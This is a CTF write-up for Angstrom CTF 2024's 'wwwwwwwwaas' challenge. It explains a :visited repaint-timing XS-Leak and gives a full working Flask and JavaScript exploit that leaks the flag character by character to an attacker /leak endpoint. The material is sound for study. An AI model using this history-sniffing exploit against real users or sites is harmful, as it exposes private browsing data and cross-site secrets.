# Wonderful Wicked Wrathful Wiretapping Wholesale World Wide Watermark as a Service
# TL;DR
- Use `:visited` CSS selector to detect visited URLs
- Apply complex styles to make browser repaint
- Oscillate link's href between test URL and dummy/unvisited URL
- Measure repaint performance with `requestAnimationFrame`
- Longer repaint time indicates the URL has been visited
# The Challenge 

`wwwwwwwwaas` was an XSLeak challenge in Angstrom CTF 2024, presenting the classical `404/200` vector
```js
app.get('/search', (req, res) => {
	if (req.cookies['admin_cookie'] !== secretvalue) {
		res.status(403).send("Unauthorized");
		return;
	}
	try {
		let query = req.query.q;
		for (let flag of flags) {
			if (flag.indexOf(query) !== -1) {
				res.status(200).send("Found");
				return;
			}
		}
		res.status(404).send("Not Found");
	} catch (e) {
		console.log(e);
		res.sendStatus(500);
	}
})
```

In usual scenarios, one could use a simple simple script leveraging `error events` to leak whether `onerror/onload` were triggered and forming the flag based on that
```js
function probeError(url) {
  let script = document.createElement('script');
  script.src = url;
  script.onload = () => console.log('Onload event triggered');
  script.onerror = () => console.log('Error event triggered');
  document.head.appendChild(script);
}
// because google.com/404 returns HTTP 404, the script triggers error event
probeError('https://google.com/404');

// because google.com returns HTTP 200, the script triggers onload event
probeError('https://google.com/');
```
However, in this case the authors included the following headers, making it harder to use such a simpler oracle
```js
app.use((req, res, next) => {
	res.set('X-Frame-Options', 'deny');
	res.set('X-Content-Type-Options', 'nosniff');
	res.set('Cache-Control', 'no-store');
	next()
})

```

`X-Content-Type-Options` will basically raise errors since the endpoint returns `text/html` as a `content-type`, so loading tags with that will return 
`Refused to execute script from 'http://localhost:21111/test' because its MIME type ('text/html') is not executable, and strict MIME type checking is enabled.```

![image](https://github.com/ixSly/CTFs/assets/32583633/4a61004c-a905-4773-a7ab-f3bcb6de8acb)

# The Oracle
The intended solution was a bug, [reported](https://issues.chromium.org/issues/40091173) and actioned in chromium bugs, demonstrating how the leak is possible. The oracle leverages the `:visited` CSS selector to determine if a specific URL has been visited. By applying different styles to visited links, the browser reveals the visit status through performance differences. The process starts by defining a link with complex styles that make the browser work harder to render it
```css
#target {
    color: white;
    background-color: white;
    outline-color: white;
}
#target:visited {
    color: #feffff;
    background-color: #fffeff;
    outline-color: #fffffe;
}
```

The link's href is oscillated between the URL we want to leak and a known `unvisited URL` randomly generated, forcing the browser to repaint the link each time. 

```js
function generateUnvisitedUrl () {
    return 'https://' + Math.random() + '/' + Date.now();
}
.....
function startOscillatingHref(testUrl) {
    oscillateInterval = setInterval(function() {
        targetLink.href = isPointingToBasisUrl ? testUrl : basisUrl;
        isPointingToBasisUrl = !isPointingToBasisUrl;
    }, 0);
}

function stopOscillatingHref() {
    clearInterval(oscillateInterval);
    targetLink.href = basisUrl;
    isPointingToBasisUrl = true;
}
```

The performance is measured by counting the number of `requestAnimationFrame` callbacks, which indicates how often the browser repaints the element. If the link is visited, it takes longer to repaint due to the extra styles applied by the `:visited` selector:
```js
var tickCount = 0;
var tickRequestId;

function startCountingTicks() {
    tickRequestId = requestAnimationFrame(function tick() {
        ++tickCount;
        tickRequestId = requestAnimationFrame(tick);
    });
}

function stopCountingTicks() {
    cancelAnimationFrame(tickRequestId);
    var oldTickCount = tickCount;
    tickCount = 0;
    return oldTickCount;
}
```
I've forked the challenged ~~because I am lazy~~ so it works without authentication, testing the [author's PoC ](https://issues.chromium.org/action/issues/40091173/attachments/53139586?download=false)showed some promising results when testing locally, with a local flag `flag{123123}`, when testing `http://127.0.0.1:21111/search?q=flag`

![image](https://github.com/ixSly/CTFs/assets/32583633/9b7c4a97-9f2f-4fd8-b19b-7a709a818536)

# The Solution
This technique was used by [TeamItaly](https://github.com/TeamItaly/TeamItalyCTF-2023/tree/master/leakynotev3/writeup) in a challenge called `leakynote` where the automated the solution, a successful one should stably leak the flag char by char.  I was too late to the CTF so unfortunately wasn't able to solve it on time. 
Finally, I came up with the following automated solution

```python
import os
from flask import Flask, render_template_string, request

app = Flask(__name__)
URL = "http://127.0.0.1:21111/"
CHARSET = "1234567890" # for local testing 
#CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
ex_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Test</title>
    <style type="text/css">
        /* Set it up so the target link element has different colors when pointing to a
           visited vs unvisited URL. */
        #target {
            color: white;
            background-color: white;
            outline-color: white;
        }
        #target:visited {
            color: #feffff;
            background-color: #fffeff;
            outline-color: #fffffe;
        }
    </style>
</head>
<body>
<script>
    async function isVisited(url) {
        let pocw = window.open(`/poc?url=${encodeURIComponent(url)}`, 'poc');
        pocw.focus();
    }

    // Extract the fragment identifier from the URL
    let hash = window.location.hash.substring(1) || "flag{g68r|a";
    let [guess, current_guess] = hash.split('|');
    let base_url = '{{CHALLENGE_URL}}search?q=flag{'; //change based on flag format
    let charset = '{{ CHARSET }}'.split('');

    async function exploit(current_guess) {
        let w = open(`${base_url}${guess}${current_guess}`, 'guess');
        await new Promise((resolve) => setTimeout(resolve, 1000));
        w.close();
        isVisited(`${base_url}${guess}${current_guess}`);
    }
    exploit(current_guess);
</script>
</body>
</html>
'''

poc_html = '''
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <style type="text/css">
        #target {
            color: white;
            background-color: white;
            outline-color: white;
        }
        #target:visited {
            color: #feffff;
            background-color: #fffeff;
            outline-color: #fffffe;
        }
    </style>
</head>
<body>
    <div id="entryDisplay">
        Enter a URL to test for visited status:
        <input id="urlInput" type="text" size="60" value="{{ url }}" autofocus/>
        <button id="testButton">Test</button>
    </div>
    <script type="text/javascript">
        (function () {
            var entryDisplay = document.getElementById('entryDisplay');
            var urlInput = document.getElementById('urlInput');
            var testButton = document.getElementById('testButton');
            
            var basisUrl;
            var controlUrl;
            var experimentUrl;
            
            var targetLink;
            var controlTickCount;

            function generateUnvisitedUrl () {
                return 'https://' + Math.random() + '/' + Date.now();
            }
            
            testButton.addEventListener('click', function () {
                basisUrl = generateUnvisitedUrl();
                controlUrl = generateUnvisitedUrl();
                experimentUrl = urlInput.value;
                console.log({ experimentUrl })
                entryDisplay.remove();
                
                document.body.style.overflow = 'hidden';
                
                targetLink = document.createElement('a');
                targetLink.id = 'target';
                targetLink.href = basisUrl;
                
                var garbageText = '業雲多受片主...'.repeat(28);
                targetLink.appendChild(document.createTextNode(garbageText));
                
                targetLink.style.display = 'block';
                targetLink.style.width = '5px';
                targetLink.style.fontSize = '2px';
                targetLink.style.outlineWidth = '24px';
                targetLink.style.textAlign = 'center';
                targetLink.style.filter =
                    'contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%)';
                targetLink.style.textShadow = '16px 16px 10px #fefffe';
                targetLink.style.transform = 'perspective(100px) rotateY(37deg)';
                
                document.body.appendChild(targetLink);
                
                requestAnimationFrame(function () {
                    requestAnimationFrame(function () {
                        runTestStage(false);
                    });
                });
            });
            
            function runTestStage (isExperimentStage) {
                var testUrl = isExperimentStage ? experimentUrl : controlUrl;
                startCountingTicks();
                startOscillatingHref(testUrl);
                
                setTimeout(async function () {
                    stopOscillatingHref();
                    
                    if (!isExperimentStage) {
                        controlTickCount = stopCountingTicks();
                        runTestStage(true);
                        return;
                    }
                    
                    var experimentTickCount = stopCountingTicks();
                    targetLink.remove();
                    
                    var ratio = experimentTickCount / controlTickCount;
                    console.log("RATIO", experimentTickCount, controlTickCount, ratio)
                    var likelyVisited = ratio < 0.7;
                   
                    async function sendBeacon(cond){
                        let url = opener ? opener.location.hash.substring(1) : "flag{g68r|a";
                        let [guess, current_guess] = url.split('|');
                        if(cond){
                            await fetch(`/leak?flag=${guess}${current_guess}`);
                            if (opener) {
                                opener.location.href = `/?query=${Math.random()}&ratio=${ratio}#${guess}${current_guess}|a`;
                            }
                        }
                        else {
                            let charset = '{{ CHARSET }}'.split('');
                            if (opener) {
                                opener.location.href = `/?query=${Math.random()}&ratio=${ratio}#${guess}|${charset[charset.indexOf(current_guess)+1]}`;
                            }
                        }
                    }
                    sendBeacon(likelyVisited);

                    document.body.style.overflow = 'visible';
                    
                    var outputDom = document.createElement('p');
                    
                    outputDom.appendChild(document.createTextNode('Result for '));
                    
                    var linkDom = document.createElement('a');
                    linkDom.href = experimentUrl;
                    linkDom.appendChild(document.createTextNode(experimentUrl));
                    outputDom.appendChild(linkDom);
                    
                    outputDom.appendChild(document.createTextNode(': likely '));
                    
                    var resultDom = document.createElement('strong');
                    resultDom.innerHTML = likelyVisited ? 'VISITED' : 'UNVISITED';
                    resultDom.style.color = likelyVisited ? 'green' : 'red';
                    outputDom.appendChild(resultDom);
                    
                    outputDom.appendChild(document.createTextNode(
                        ' (' + experimentTickCount + ' ticks vs ' +
                        controlTickCount + ' ticks; ratio = ' +
                        Math.round(ratio * 100) + '%).'));
                    
                    document.body.appendChild(outputDom);
                    
                    var retryButton = document.createElement('button');
                    retryButton.innerHTML = 'Try Another URL';
                    retryButton.addEventListener('click', function (e) {
                        location.reload();
                    });
                    document.body.appendChild(retryButton);
                    retryButton.focus();
                }, 500);
            } 
                
            var oscillateInterval;
            var isPointingToBasisUrl = true;
            function startOscillatingHref (testUrl) {
                oscillateInterval = setInterval(function () {
                    targetLink.href = isPointingToBasisUrl ? testUrl : basisUrl;
                    isPointingToBasisUrl = !isPointingToBasisUrl;
                }, 0);
            }
            function stopOscillatingHref () {
                clearInterval(oscillateInterval);
                targetLink.href = basisUrl;
                isPointingToBasisUrl = true;
            }

            var tickCount = 0;
            var tickRequestId;
            function startCountingTicks () {
                tickRequestId = requestAnimationFrame(function () {
                    ++tickCount;
                    startCountingTicks();
                });
            }
            function stopCountingTicks () {
                cancelAnimationFrame(tickRequestId);
                var oldTickCount = tickCount;
                tickCount = 0;
                return oldTickCount;
            }
        })();
        
        setTimeout(function () {
            var testButton = document.getElementById('testButton');
            testButton.click();
        }, 1000);
   
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(ex_html, CHALLENGE_URL=URL,CHARSET=CHARSET)

@app.route('/poc')
def poc():
    args = request.args.get('url')
    return render_template_string(poc_html, url=args, CHALLENGE_URL=URL,CHARSET=CHARSET)

@app.route('/leak')
def leak():
    flag = request.args.get('flag')
    if flag[-1] == '}':
        print(flag)
    return ""

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=1337)

```
Running this locally leaks the flag. 

![image](https://github.com/ixSly/CTFs/assets/32583633/dcaabc94-65eb-49ac-b32d-f1bb37c27cfa)


